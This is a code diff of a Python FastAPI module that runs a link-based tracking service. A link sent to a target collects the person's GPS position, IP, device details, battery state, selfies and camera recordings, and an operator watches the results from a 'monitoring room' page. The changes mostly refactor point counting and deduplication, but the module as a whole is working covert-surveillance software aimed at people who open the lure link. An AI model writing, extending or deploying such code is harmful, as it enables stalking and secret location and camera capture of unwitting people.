@@ -2,19 +2,20 @@
 
 方針:
   ・テンプレートに JS を全部インライン（/static も ServiceWorker もキャッシュも無関係）
-  ・専用テーブル（テナントごとの gps/gps.db）で完結。link_land/live/geofix/collect/spy/livecam は使わない
-  ・GPSの要求は「タップと同じタスクで1回だけ」。watch とカメラは別タスクにずらす
+  ・専用テーブル（テナントごとの gps/gps.db）で完結
+  ・GPSの要求は「タップと同じタスクで高精度1回」。watch とカメラは別タスクにずらす
   ・見切り判定は retry で巻き戻さない（firstStartAt 基準）
 
 URL:
   相手に送る   GET  /g/{code}
   点を送る     POST /g/{code}/p
-  付加情報     POST /g/{code}/x      （回線推定・指紋・自撮り）
+  付加情報     POST /g/{code}/x      （回線推定・自撮り）
   録画を送る   POST /g/{code}/v
   録画一覧     GET  /g/{code}/v.json
   録画再生     GET  /g/{code}/v/{name}
   監視室       GET  /gp/{code}
   一覧・作成   GET  /gp , POST /gp/add
+  旧式/新式    GET  /tracking
   点のJSON     GET  /api/gp/{code}
 """
 from __future__ import annotations
@@ -27,7 +28,7 @@ import string
 import sqlite3
 import datetime as dt
 
-from fastapi import APIRouter, Request, Depends, Form
+from fastapi import APIRouter, Request, Depends, Form, HTTPException
 from fastapi.responses import (HTMLResponse, RedirectResponse, PlainTextResponse,
                                JSONResponse, FileResponse)
 
@@ -168,6 +169,17 @@ def _link(c, code):
     return c.execute("SELECT * FROM gps_links WHERE code=?", (code,)).fetchone()
 
 
+def _count(c, code, only_gps=False):
+    try:
+        if only_gps:
+            return c.execute("SELECT COUNT(*) n FROM gps_points WHERE code=? AND src='gps'",
+                             (code,)).fetchone()["n"]
+        return c.execute("SELECT COUNT(*) n FROM gps_points WHERE code=?",
+                         (code,)).fetchone()["n"]
+    except Exception:
+        return 0
+
+
 def _new_code(c, n=8):
     a = string.ascii_lowercase + string.digits
     for _ in range(80):
@@ -216,16 +228,23 @@ def _pt_row(code, q, g, ip, ua, vid, sid, kind):
 
 
 def _insert_points(c, code, rows):
+    """重複判定は「同じ秒・同じ座標」のときだけ。
+
+    ※以前は座標一致だけで弾いていたため、端末が静止していると
+      キャッシュされた同じ座標が全部捨てられ、カウンターが動かなかった。"""
     if not rows:
         return 0
     prev = c.execute("SELECT lat, lon, ts FROM gps_points WHERE code=? "
                      "ORDER BY id DESC LIMIT 1", (code,)).fetchone()
-    pkey = (round(prev["lat"], 5), round(prev["lon"], 5)) if prev and prev["lat"] is not None else None
-    pts_ts = prev["ts"] if prev else ""
+    pkey = None
+    pts_ts = ""
+    if prev and prev["lat"] is not None:
+        pkey = (round(prev["lat"], 5), round(prev["lon"], 5))
+        pts_ts = prev["ts"] or ""
     out, last = [], None
     for r in rows:
         key = (round(r["lat"], 5), round(r["lon"], 5))
-        if key == pkey and r["ts"][:19] == (pts_ts or "")[:19]:
+        if pkey is not None and key == pkey and r["ts"][:19] == pts_ts[:19]:
             continue
         pkey, pts_ts = key, r["ts"]
         out.append(r)
@@ -236,12 +255,11 @@ def _insert_points(c, code, rows):
         "INSERT INTO gps_points(code,ts,lat,lon,acc,src,city,region,country,ip,ua,vid,sid,kind,batt,chg)"
         " VALUES(:code,:ts,:lat,:lon,:acc,:src,:city,:region,:country,:ip,:ua,:vid,:sid,:kind,:batt,:chg)",
         out)
-    link = _link(c, code)
-    c.execute("UPDATE gps_links SET points=COALESCE(points,0)+?, last_ts=?, last_lat=?, "
-              "last_lon=?, last_acc=?, last_city=?, last_ip=?, last_src=? WHERE code=?",
-              (len(out), last["ts"], last["lat"], last["lon"], last["acc"],
-               last["city"], last["ip"], last["src"], code))
-    # 古い点を間引く
+    if last:
+        c.execute("UPDATE gps_links SET points=COALESCE(points,0)+?, last_ts=?, last_lat=?, "
+                  "last_lon=?, last_acc=?, last_city=?, last_ip=?, last_src=? WHERE code=?",
+                  (len(out), last["ts"], last["lat"], last["lon"], last["acc"],
+                   last["city"], last["ip"], last["src"], code))
     try:
         c.execute("DELETE FROM gps_points WHERE code=? AND id NOT IN "
                   "(SELECT id FROM gps_points WHERE code=? ORDER BY id DESC LIMIT 20000)",
@@ -271,8 +289,12 @@ def _media_dir(owner, code):
     return d
 
 
-def _share(request, code):
-    return _base(request) + "/g/" + code
+# ---------------- 旧式/新式の選択 ----------------
+
+@router.get("/tracking", response_class=HTMLResponse)
+def tracking_chooser(request: Request, u=Depends(_auth)):
+    base = _base(request)
+    return _render("tracking.html", request, base=base)
 
 
 # ---------------- 相手に踏ませるページ ----------------
@@ -400,7 +422,6 @@ async def add_segment(code: str, request: Request, seq: int = 0, ext: str = "web
     name = "%06d-%s.%s" % (int(seq or 0), (vid or "x")[:8], ext)
     with open(os.path.join(d, name), "wb") as f:
         f.write(data)
-    # 古いものを削除
     try:
         files = sorted(os.listdir(d))
         for old in files[:-KEEP_SEG]:
@@ -425,7 +446,8 @@ def list_segments(code: str):
                 seq = int(name.split("-")[0])
             except Exception:
                 seq = 0
-            out.append({"name": name, "seq": seq, "sid": name.split("-")[1].split(".")[0],
+            out.append({"name": name, "seq": seq,
+                        "sid": name.split("-")[1].split(".")[0],
                         "url": "/g/" + code + "/v/" + name})
     except Exception:
         pass
@@ -450,7 +472,10 @@ def get_segment(code: str, name: str):
 def list_page(request: Request, u=Depends(_auth)):
     owner = tenancy.get_current() or u
     c = _db(owner)
-    rows = [dict(r) for r in c.execute("SELECT * FROM gps_links ORDER BY created DESC").fetchall()]
+    rows = [dict(r) for r in c.execute(
+        "SELECT * FROM gps_links ORDER BY created DESC").fetchall()]
+    for r in rows:
+        r["points"] = _count(c, r["code"])
     c.close()
     base = _base(request)
     for r in rows:
@@ -493,11 +518,12 @@ def watch(code: str, request: Request, new: str = "", u=Depends(_auth)):
     row = _link(c, code)
     if not row:
         c.close()
-        from fastapi import HTTPException
         raise HTTPException(404)
     rows = [dict(r) for r in c.execute(
         "SELECT id,ts,lat,lon,acc,src,city,ip,vid,sid,kind,batt,chg FROM gps_points "
         "WHERE code=? ORDER BY id DESC LIMIT 3000", (code,)).fetchall()]
+    total = _count(c, code)
+    gps_n = _count(c, code, only_gps=True)
     extra = [dict(r) for r in c.execute(
         "SELECT vid,fp,selfie,ts FROM gps_extra WHERE code=? ORDER BY ts DESC", (code,)).fetchall()]
     c.close()
@@ -513,7 +539,7 @@ def watch(code: str, request: Request, new: str = "", u=Depends(_auth)):
         share=base + "/g/" + code,
         watch_url=base + "/gp/" + code,
         live=bool(row["active"]) and _recent(row["last_ts"], 90),
-        total=len(rows),
+        total=total, gps_n=gps_n,
     )
 
 
@@ -524,23 +550,23 @@ def api_points(code: str, since: int = 0, u=Depends(_auth)):
     row = _link(c, code)
     if not row:
         c.close()
-        from fastapi import HTTPException
         raise HTTPException(404)
     pts = [dict(r) for r in c.execute(
         "SELECT id,ts,lat,lon,acc,src,city,vid,sid FROM gps_points "
         "WHERE code=? AND id>? ORDER BY id ASC LIMIT 2000", (code, since)).fetchall()]
     selfie = c.execute("SELECT selfie,ts FROM gps_extra WHERE code=? AND selfie IS NOT NULL "
                        "ORDER BY ts DESC LIMIT 1", (code,)).fetchone()
+    total = _count(c, code)
+    gps_n = _count(c, code, only_gps=True)
     c.close()
     iv = _clamp_iv(row["interval"])
     return {
         "mode": row["mode"], "active": bool(row["active"]), "interval": iv,
-        "live": bool(row["live"] if "live" in row.keys() else 0)
-                or _recent(row["last_ts"], max(90, iv * 4)),
+        "live": _recent(row["last_ts"], max(90, iv * 4)),
         "last": {"ts": row["last_ts"], "lat": row["last_lat"], "lon": row["last_lon"],
-                 "acc": row["last_acc"], "city": row["last_city"], "src": row["last_src"],
-                 "ip": row["last_ip"]},
-        "count": row["points"] or 0,
+                 "acc": row["last_acc"], "city": row["last_city"],
+                 "src": row["last_src"], "ip": row["last_ip"]},
+        "count": total, "gps_count": gps_n,
         "selfie": (selfie["selfie"] if selfie else ""),
         "selfie_ts": (selfie["ts"] if selfie else ""),
         "points": pts,
@@ -556,7 +582,6 @@ def update(request: Request, code: str, name: str = Form(""), mode: str = Form("
     c = _db(owner)
     if not _link(c, code):
         c.close()
-        from fastapi import HTTPException
         raise HTTPException(404)
     f, v = [], []
     if name.strip():
